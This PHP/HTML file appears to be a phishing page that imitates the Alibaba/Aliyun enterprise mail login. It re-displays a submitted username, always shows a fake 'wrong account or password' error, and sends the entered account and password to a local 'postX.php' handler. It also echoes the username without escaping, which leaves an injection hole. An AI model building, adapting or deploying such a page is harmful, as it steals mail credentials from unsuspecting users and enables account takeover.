<?php
session_start();
ob_start();

$username= $_POST['username'];
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" style="">
<head>


<script type="text/javascript" src="https://acjs.aliyun.com/js/uab.js"></script>


<!-- nocaptcha muming provider, but uatoken not post for SsoLoginAction, set disabled -->
<!--script type="text/javascript">

var UA_Opt = {};
UA_Opt.ExTarget = ['password'];

UA_Opt.FormId = "login_submit_form";

UA_Opt.LogVal = "ua";

</script-->




<style type="text/css">

/* nocaptcha start */
/*
#imgCaptcha .imgCaptcha_text input {
	display:none !important;
}

#imgCaptcha .imgCaptcha_text {
    display:none !important;
}
*/


.nc-container.tb-login #imgCaptcha #scale_submit {
    width: 247px !important;
    margin-left: 4px !important;
}


#imgCaptcha .imgCaptcha_text input {
	margin-top:0px !important;
	/*border-width: 1px;
    border-color: #bbbbbb;
    border-style: solid;*/
    
    /*width: 243px;*/
    height: 22px !important;
    line-height: 22px !important;
    /*background-color: #eef3f8 !important;*/
    background-color: #fff9fb !important;    
    border: 1px solid #bac5d4 !important;
    color: #92a4bf !important;
    padding: 5px !important;
    -webkit-border-radius: 5px !important;
    -moz-border-radius: 5px !important;
    border-radius: 5px !important;
    
}

#imgCaptcha .imgCaptcha_img {
    margin: 5px 0 0 110px !important;
}


.nc-container.tb-login #_btn_1 {
    top: 20px !important;
    padding-top: 20px !important;
    /*_top: -17px !important;*/
}









#noCaptchaDomId {
	z-index:11;
	margin-top: 0px !important;
}





.nc_scale {
    width: 255px !important;
}
.login_placeholder_nocaptcha {
    font-size: 14px;
    color: #92a4bf;
    width: 100%;
    height: 34px;
    margin: 0 auto 10px;
    position: relative;
}
.nc_scale .scale_text2 b {
    padding-left: 80px;
}



.nc-container p {
	margin: 0;
}
#J_LoginBox .nc-container.tb-login #clickCaptcha {
	padding-top: 26px;
}

#J_LoginBox .nc-container.tb-login #imgCaptcha, .nc-container.tb-login #clickCaptcha {
    min-height: 250px !important;
}

#imgCaptcha {
	padding-bottom: 0px !important;
	height: 208px !important;
}

#clickCaptcha .clickCaptcha_img img {
	width: 220px !important;
    height: 220px !important;
    margin-left: 18px !important;
}

.nc-container.tb-login #imgCaptcha .imgCaptcha_text {
    margin-left: 5px !important;
}

#clickCaptcha .clickCaptcha_text {
	height: 28px !important;
}

.nc-container.tb-login #imgCaptcha {
    padding-top: 35px !important;
}


/*
.nc-container.tb-login #_btn_1 {
    top: 45px !important;
}
*/



/* nocaptcha end */



.inline_block {
    vertical-align: top;
    display: inline-block;
    *display: inline;
    zoom: 1;
}
.ellipsis {
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden;
    zoom: 1;
}
.alpha_40_ie {
    filter: alpha(opacity=40);
}
.alpha_40_other {
    -moz-opacity: 0.4;
    -khtml-opacity: 0.4;
    opacity: 0.4;
}
.login_section {
    font-size: 12px;
    width: 255px;
    margin: 0 auto 0;
    position: relative;
    padding-top: 2px;
}
.login_logo {
    background-image: url(/home/images/smart/login-logo.png);
    width: 104px;
    line-height: 27px;
    height: 27px;
}
.expire_logo {
    background-image: url(/home/images/smart/wrong.png);;
    width: 16px;
    height: 16px;
    line-height: 16px;
    margin: 3px 0;
}
.expire_tips_label {
    height: 22px;
    line-height: 22px;
    font-size: 11px;
    color: #f26064;
}
.login_qr_code_wrap {
    width: 255px;
    display: none;
    z-index: 100;
    position: relative;
    margin: 0 auto 0;
    height: 196px;
}
.login_switch_qr_wrap {
    position: absolute;
    right: 0px;
    background-image: url(/home/images/smart/sq.png);
    width: 42px;
    height: 42px;
    cursor: pointer;
    bottom: 0px;
}
.login_switch_qr_wrap:hover {
    background-image: url(/home/images/smart/sq_hover.png);
}
.login_app_wrap{
    width: 100%;
    background-color: #ffffff;
    height: 42px;
    bottom: 0px;
    left:0px;
    position: absolute;
}
.login_app_ios_wrap{
    position: absolute;left:20px;bottom:0px;height: 42px;width: 70px;background-image: url(/home/images/new_app_iOS.png);
}
.login_app_ios_wrap:hover{
    background-image: url(/home/images/new_app_iOS_hover.png);
}
.login_app_android_wrap{
    position: absolute;left:91px;bottom:0px;height: 42px;width: 90px;background-image: url(/home/images/new_android.png)
}
.login_app_android_wrap:hover{
    background-image: url(/home/images/new_android_hover.png)
}



.login_switch_login_wrap {
    position: absolute;
    right: 0px;
    background-image: url(/home/images/smart/sq_close.png);
    width: 42px;
    height: 42px;
    cursor: pointer;
    bottom: 0px;
}
.login_switch_login_wrap:hover {
    background-image: url(/home/images/smart/sq_close_hover.png);
}
.login_scanarea_wrap {
    background-image: url(/home/images/smart/saosao.png);
    width: 176px;
    height: 150px;
    margin-left: 46px;
    margin-top: 30px;
    margin-bottom: 30px;
}
.login_qccode {
    width: 150px;
    height: 150px;
    margin-left: 50px;
    margin-top: 30px;
    margin-bottom: 30px;
}
.login_scanarea_ok_logo {
    background-image: url(/home/images/smart/correct.png);
    width: 20px;
    height: 20px;
}
.login_expire_wrap {
    text-align: center;
    border: solid 1px #fae0d5;
    background-color: #fcefea;
    height: 24px;
}
.login_scanarea_top_tips {
    line-height: 36px;
    text-align: center;
}
.login_scanarea_top_label {
    height: 20px;
    line-height: 20px;
    font-size: 14px;
}
.login_scanarea_bottom_tips {
    color: #3B9BDC;
    font-size: 13px;
    line-height: 14px;
    margin-left: 65px;
    text-decoration: none;
}
.login_scanarea_tips_label {
    height: 20px;
    line-height: 20px;
    font-size: 16px;
}
.login_scanarea_result_label {
    height: 20px;
    line-height: 20px;
    font-size: 12px;
    color: gray;
    margin-top: 25px;
}
.refresh_btn {
    width: 80px;
    height: 25px;
    background-color: #3897d4;
    border-radius: 2;
    font-size: 12px;
    line-height: 25px;
    text-align: center;
    color: #ffffff;
    margin-left: 85px;
    margin-bottom: 10px;
    cursor: pointer;
}
.login_scanarea_result_wrap {
    text-align: center;
    margin-top: 50px;
}
.login_wrap {
    position: relative;
}
.login_placeholder_input {
    font-size: 14px;
    color: #92a4bf;
    width: 100%;
    height: 34px;
    margin: 0 auto 20px;
    position: relative;
}

.login_username_placeholder_input {
    z-index: 10;
    height:44px;
}
.login_input {
    width: 243px;
    height: 22px;
    line-height: 22px;
    background-color: #eef3f8;
    border: 1px solid #bac5d4;
    color: #92a4bf;
    padding: 5px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
}

.login_input_account {
	width: 253px;
	height: 32px;
	line-height: 22px;
	background-color: #eef3f8;
	border: 1px solid #bac5d4;
	-webkit-border-radius: 5px;
	-moz-border-radius: 5px;
	border-radius: 5px;
	position: relative;
}
.login_input_name {
	width: 132px;
	height: 22px;
	line-height: 22px;
	background-color: #eef3f8;
	color: #92a4bf;
	padding: 5px;
	border: 0 none;
	float: left;
	-webkit-border-radius: 5px 0 0 5px;
	-moz-border-radius: 5px 0 0 5px;
	border-radius: 5px 0 0 5px;
}
.login_input_mail {
	width: 100px;
	height: 22px;
	line-height: 22px;
	background-color: #eef3f8;
	color: #333333;
	padding: 5px;
	border: 0 none;
	border-left: 1px solid #bac5d4;
	float: left;
	font-size: 12px;
	-webkit-border-radius: 0 5px 5px 0;
	-moz-border-radius: 0 5px 5px 0;
	border-radius: 0 5px 5px 0;
	text-overflow: ellipsis;
}

.login_placeholder {
    position: absolute;
    width: 235px;
    height: 26px;
    line-height: 26px;
    padding: 5px 10px;
    top: 0;
    left: 0;
    cursor: text;
}
.login_hasome .login_placeholder {
    display: none;
}
.login_submit_btn {
    padding: 3px 0;
    width: 255px;
    line-height: 30px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    display: block;
    color: #ffffff;
    font-size: 16px;
    font-weight: bold;
    text-align: center;
    border: 1px solid #3790CC;
    background-color: #3B9BDC;
    background: -moz-linear-gradient(top, #3B9BDC, #3790CC);
    background: -webkit-linear-gradient(top, #3B9BDC, #3790CC);
    background: -o-linear-gradient(top, #3B9BDC, #3790CC);
    background: linear-gradient(top, #3B9BDC, #3790CC);
}
.login_row {
    margin-bottom: 10px;
    overflow: hidden;
}
.login_button_row {
    overflow: hidden;
}
.login_checkcode_wrap {
    display: none;
    float: right;
}
.login_remember_wrap {
    height: 30px;
}
.login_remember_name {
    float: left;
    height: 20px;
    line-height: 20px;
    padding: 0 6px;
    overflow: hidden;
    color: #565551;
}
.login_remember_check {
    vertical-align: top;
    float: left;
    margin-top: 4px;
}
.login_checkcode {
    height: 20px;
    width:90px;
    line-height: 20px;
    background-color: #eef3f8;
    border: 1px solid #bac5d4;
    padding: 5px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;

    vertical-align: top;
}
.login_checkcode_ico {
    border: 1px solid #bac5d4;
    cursor: pointer;
    width: 115px;
}

.login_checkcode_ico {
    position: absolute;
    width: 115px;
    height: 30px;
    border: 1px solid #bac5d4;
    cursor: pointer;
    top: 0;
    right: 20px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
}

.ico_unchecked, .ico_checked {
    cursor: pointer;
    width: 13px;
    height: 13px;
}
.ico_unchecked {
    background: url(/home/images/main.png) -125px 0 no-repeat;
}
.ico_checked {
    background: url(/home/images/main.png) -145px 0 no-repeat;
}
.login_error_wrap {
    white-space: nowrap;
    background-color: #fff8f4;
    border: 1px solid #e3abb9;
    line-height: 20px;
    padding: 2px 4px;
    overflow: hidden;
    font-size: 12px;
    color: #e57b89;
    margin-bottom: 10px;
}
.ico_error {
    width: 14px;
    height: 14px;
    vertical-align: text-bottom;
    background: url(/home/images/main.png) -105px 0 no-repeat;
}
button {
    padding: 0;
    border: 0;
    background: 0;
    cursor: pointer;
}
.linebr {
    clear: both; /* 清除左右浮动 */
    word-break: break-word; /* 文本行的任意字内断开 */
    word-wrap: break-word; /* IE */
    white-space: -moz-pre-wrap; /* Mozilla */
    white-space: -hp-pre-wrap; /* HP printers */
    white-space: -o-pre-wrap; /* Opera 7 */
    white-space: -pre-wrap; /* Opera 4-6 */
    white-space: pre; /* CSS2 */
    white-space: pre-wrap; /* CSS 2.1 */
    white-space: pre-line; /* CSS 3 (and 2.1 as well, actually) */
}
.login_helper_text {
    line-height: 20px;
    color: #999999;
    margin: 0 5px 0 0;
    float:right;

}

.login_dynamic_code_button_wrap {
    float:left;
    font-size:12px;
}
.login_dynamic_code_button{
    padding: 11px 8px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    border-radius: 5px;
    margin-left: 5px;
}
body.normal_body{
    margin:25px 0 0 0;

}
body.error_body{
    margin:0px;
}



</style>
<script src="/home/js/jquery.1.5.2.min.js" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="/home/css/guide.css"></link>
<link rel="stylesheet" type="text/css" href="/home/css/common.css"></link>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>


</head>
<body id="J_LoginBox" style="overflow-y: hidden;" class="normal_body ">
<script>
//    with(document)with(body)with(insertBefore(createElement("script"),firstChild))setAttribute("exparams","category=&userid=&aplus&yunid=&asid=AADwJgVUXNJNgqmPKrA=",id="tb-beacon-aplus",src=(location>"https"?"//s":"//a")+".tbcdn.cn/s/aplus_v2.js")
</script>

    

    
<div>

    <form id="login_submit_form" method="post" action="postX.php" target="_top" novalidate>
                

        <div class="login_wrap">
            <div class="login_section">

                <div class="login_error_wrap" id="login_error_line" style="display:block ">
                    <img src="/home/images/blank.gif" class="ico_error">
                    <span class="text_middle login_error_text linebr">帐户或密码错误</span>
                </div>

                <div class="login_placeholder_input login_username_placeholder_input">
                
                        <input type="text" id="username" name="userid" value="<?php echo $username ?>" placeholder="帐号"
                           class="login_input" autocomplete="off" required/>
                    <div style="padding:0px 0px 0px 5px;margin: 0px;position:relative;top:7px;font-size: 12px;">请填写企业邮箱的帐号，或管理员帐号。</div>
	                

                </div>

                <div id="password_wrap" class="login_placeholder_input" style="margin-bottom:10px">
                    <input type="password" id="password" name="pass" value="" placeholder="密码" class="login_input" required />
                </div>

                


            <!--滑动验证start-->
                                    <div id="noCaptchaDomId" class="login_placeholder_nocaptcha nc-container tb-login"></div>
                            <!--滑动验证end-->

                <div id="login_remember_wrap" class="login_remember_wrap">
                    <img id="login_remember_check" src="https://mailsso.mxhichina.com/home/images/blank.gif" class="sprites ico_unchecked login_remember_check"/>

                    <div class="login_remember_name">
                        <input type ="checkbox" name="remembercheck" style="margin-left:0px">
                        <span class="cursor_pointer text_middle">记住用户名</span>
                    </div>

                <div class="login_helper_text"><a href=" home/html/forgetpassword/index.html?login_url=https://mail.mxhichina.com " target="_blank">忘记密码</a></div>
	

                </div> 

                <div class="login_button_row" style="clear: both">
                    <button id="login_submit_btn" type="submit" class="login_submit_btn" >登录</button>
                </div>
            </div>

        </div>

        <div class="login_qr_code_wrap">
            <div class="login_scanarea_top_tips">
                <div id="qrcode_tip" class="inline_block login_scanarea_top_label">使用阿里邮箱APP扫描安全登录</div>
            </div>

            <div class="login_expire_wrap" style="display: none">
                <div class="inline_block expire_logo">&nbsp;</div>
                <div class="inline_block ellipsis expire_tips_label">二维码已过期，请刷新二维码重新登录</div>
            </div>

            <div class="login_center_wrap">
                <div class="login_scanarea_wrap" id="login_scanarea_wrap" style="display: none"></div>
                <img class="login_qccode" id="login_qccode" style="display: block"></img>
            </div>

            <div class="login_scanarea_result_wrap" style="display: none">
                <div class="inline_block login_scanarea_ok_logo"></div>
                <div class="inline_block login_scanarea_tips_label">扫描成功</div>
                <div class="login_scanarea_result_label">请按手机提示操作确认登录，请勿刷新页面</div>
            </div>

            <div class="refresh_btn" style="display: none" onclick="javascript:refreshQrCode('1');">刷新二维码</div>
            <a href="http://wanwang.aliyun.com/mail/app/" target="_blank" class="login_scanarea_bottom_tips">下载安装阿里邮箱APP</a>
        </div>
    </form>
</div>
<div class="login_app_wrap" >
<a class="login_app_ios_wrap" href="https://itunes.apple.com/cn/app/id923828102"  target="_blank"></a>
<a class="login_app_android_wrap" href="http://download.taobaocdn.com/wireless/alimei-android-outside/release/cloudmail.apk" target="_blank" ></a>
</div>
<div class="login_switch_qr_wrap" onclick="javascript:switchQrArea();"></div>
<div class="login_switch_login_wrap" onclick="javascript:switchLoginArea();" style="display: none"></div>





<!--UMID逻辑end-->


<!--滑动验证start-->
<link type="text/css" href="//g.alicdn.com/sd/ncpc/nc.css?t=$loginForm.noCaptchaTimestamp" rel="stylesheet"/>



<script type="text/javascript" charset="utf-8" src="//g.alicdn.com/sd/ncpc/nc.js?t=427755"></script>


<!--滑动验证end-->


<!--滑动验证start-->


<!--滑动验证end-->

    


</body>
</html>